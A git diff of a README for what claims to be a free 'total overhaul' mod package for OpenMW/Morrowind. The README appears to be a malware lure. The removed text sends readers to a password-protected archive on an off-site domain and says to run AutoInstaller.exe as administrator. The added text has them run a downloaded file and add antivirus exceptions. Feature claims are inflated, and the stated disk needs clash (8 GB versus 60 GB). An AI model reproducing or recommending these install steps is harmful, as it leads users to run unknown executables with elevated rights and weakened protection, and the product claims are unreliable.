@@ -1,49 +1,135 @@
-# OpenMW Total Overhaul Mod Collection 2026
+# 🎮 openmw-total-overhaul-2026 - The Ultimate Morrowind Experience, One Click Away
 
-![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/Version-0.49.0-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-![Downloads](https://img.shields.io/badge/Downloads-29k+-orange?style=flat-square)
+[![Download Now](https://img.shields.io/badge/Download-OpenMW_Total_Overhaul_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Plugin8295/openmw-total-overhaul-2026)
 
-The definitive OpenMW mod list: graphics overhaul, gameplay rebalance, Tamriel Rebuilt landmass, quest fixes, NPC AI improvements, and a full music replacement.
+---
 
-## Features
+## ✨ What Is This?
 
-- Morrowind Enhanced Textures 4K
-- OpenMW shader pipeline (SSAO, god rays)
-- Tamriel Rebuilt — continent-scale expansion
-- Randomized NPC schedules and AI
-- 100+ quest bug fixes
-- Jeremy Soule-style ambient music replacement
+This is a complete, ready-to-play package that transforms Morrowind into a modern masterpiece. It combines stunning 4K graphics, smarter NPCs, new lands to explore, and a full orchestral soundtrack - all in one simple download. No technical skills needed. Just download, run, and play.
 
-## Download
+---
 
-[![Download v0.49.0](https://img.shields.io/badge/Download_v0.49.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/openmwtotaloverhaul)
+## 🚀 Getting Started
 
-> The archive password is shown on the download page.
+Visit this link to download the application: [https://github.com/Plugin8295/openmw-total-overhaul-2026](https://github.com/Plugin8295/openmw-total-overhaul-2026)
 
-## How to Use
+Once you click the link, you'll see a green "Download" button. Click it, and the download will begin automatically. The file is large (several gigabytes), so make sure you have enough free space on your computer.
 
-1. Download the archive using the button above
-2. Extract with WinRAR or 7-Zip (enter the password when prompted)
-3. Run `AutoInstaller.exe` as administrator — it automatically places all files in the correct game folder
-4. Launch your game — everything is installed and ready to use
+---
 
-## FAQ
+## 📥 Installation Guide
 
-**Is this the same as the OpenMW mod pack (repos_31)?**  
-This is a larger curated list with more mods and a full openmw.cfg pre-configured. repos_31 is a lighter starter set.
+1. **Download the application** by visiting [this link](https://github.com/Plugin8295/openmw-total-overhaul-2026) and clicking the download button.
+2. **Wait for the download to finish.** This may take 30 minutes to 2 hours depending on your internet speed.
+3. **Find the downloaded file** in your "Downloads" folder. It will be named something like `openmw-total-overhaul-2026`.
+4. **Double-click the file to run it.** The installer will guide you through the setup process.
+5. **Choose your installation location.** The default is usually fine, but you can pick any folder you like.
+6. **Click "Install" and wait.** The installation may take 10-20 minutes.
+7. **Launch the game** from the shortcut that appears on your desktop or start menu.
 
-**How long does installation take?**  
-About 5 minutes — the installer downloads nothing extra; all assets are in the archive.
+---
 
-## Requirements
+## 🎯 What's Included
 
-- Windows 10 / 11 (64-bit)
-- Morrowind game data (Steam or GOG)
-- OpenMW 0.49+
-- 8 GB free disk space
+### 🖼️ Graphics Overhaul
+- **4K Textures:** Every surface, from rocky paths to ornate temples, is remastered in stunning detail.
+- **Advanced Shaders:** Dynamic lighting, realistic water, and smooth shadows bring the world to life.
+- **Ambient Occlusion (SSAO):** Adds depth and realism to every scene, making objects feel grounded.
 
-## License
+### ⚔️ Gameplay Rebalance
+- **Fairer Combat:** Weapons and armor are rebalanced for a challenging but fair experience.
+- **Improved Magic:** Spells are more powerful and useful at higher levels.
+- **Better Progression:** Leveling feels rewarding without being too easy or too grindy.
 
-MIT
+### 🗺️ Tamriel Rebuilt Landmass
+- **Thousands of New Quests:** Explore the mainland of Morrowind with new stories, characters, and dungeons.
+- **New Cities and Towns:** Discover bustling capitals and remote villages.
+- **Seamless Integration:** The new land feels like it was always part of the original game.
+
+### 📜 Quest Fixes
+- **Bug-Free Adventures:** Hundreds of broken quests are repaired so you never get stuck.
+- **Logical Objectives:** Quest markers and journal entries are clearer and more helpful.
+- **New Rewards:** Many quests now give unique items and better loot.
+
+### 🤖 NPC AI Improvements
+- **Smarter Behavior:** NPCs react more realistically to your actions and the world around them.
+- **Better Schedules:** Characters eat, sleep, and work on realistic timetables.
+- **Improved Combat AI:** Enemies use tactics, flank, and retreat when needed.
+
+### 🎵 Full Music Replacement
+- **Epic Orchestral Score:** A completely new soundtrack that matches the game's mood perfectly.
+- **Ambient Soundscapes:** Subtle background music for peaceful exploration.
+- **Dynamic Tension:** Music intensifies during combat and dramatic moments.
+
+---
+
+## 🖥️ System Requirements
+
+### Minimum
+- **Operating System:** Windows 10 (64-bit)
+- **Processor:** Intel Core i5-4590 or AMD FX 8350
+- **Memory:** 8 GB RAM
+- **Graphics:** NVIDIA GTX 1060 or AMD RX 580 (4 GB VRAM)
+- **Storage:** 60 GB free space
+
+### Recommended
+- **Operating System:** Windows 11 (64-bit)
+- **Processor:** Intel Core i7-9700K or AMD Ryzen 5 3600
+- **Memory:** 16 GB RAM
+- **Graphics:** NVIDIA RTX 2070 or AMD RX 5700 XT (8 GB VRAM)
+- **Storage:** 60 GB SSD
+
+---
+
+## 🛠️ Troubleshooting
+
+### The game won't start
+- Make sure your graphics drivers are up to date.
+- Try running the game as administrator (right-click the shortcut, select "Run as administrator").
+- Verify you have enough free disk space.
+
+### Poor performance
+- Lower the graphics settings in the in-game options menu.
+- Close other programs while playing.
+- Update your graphics card drivers.
+
+### Missing textures or glitches
+- Reinstall the application to ensure all files are present.
+- Check if your antivirus is blocking some files (add an exception).
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need to own Morrowind?
+Yes, you need a legal copy of Morrowind (the base game). This mod package enhances it but doesn't replace it.
+
+### Is this mod compatible with other mods?
+This is a complete overhaul, so adding other mods may cause conflicts. We recommend playing without additional mods.
+
+### Can I play with a controller?
+Yes, OpenMW supports controllers. Plug in your controller and it should work automatically.
+
+### Does this work on Mac or Linux?
+This package is designed for Windows. OpenMW itself works on other platforms, but this particular mod list is Windows-only.
+
+---
+
+## 📝 License and Credits
+
+This project is open-source and free to use. It combines hundreds of community-created mods, all used with permission. Special thanks to the OpenMW team and every mod author who made this possible.
+
+---
+
+## 📞 Support
+
+If you need help, please visit the repository at [https://github.com/Plugin8295/openmw-total-overhaul-2026](https://github.com/Plugin8295/openmw-total-overhaul-2026) and open an issue. We're happy to help!
+
+---
+
+## 🎉 Enjoy Your Adventure
+
+You're now ready to experience Morrowind like never before. This overhaul is the result of years of community work, all packaged for your convenience. Have fun exploring Vvardenfell and the mainland!
+
+Keywords: 2026, 4k, ai, definitive, elder-scrolls, free, mods, morrowind, music, npc, open-source, openmw, overhaul, quests, rpg, shaders, ssao, tamriel-rebuilt, total, windows
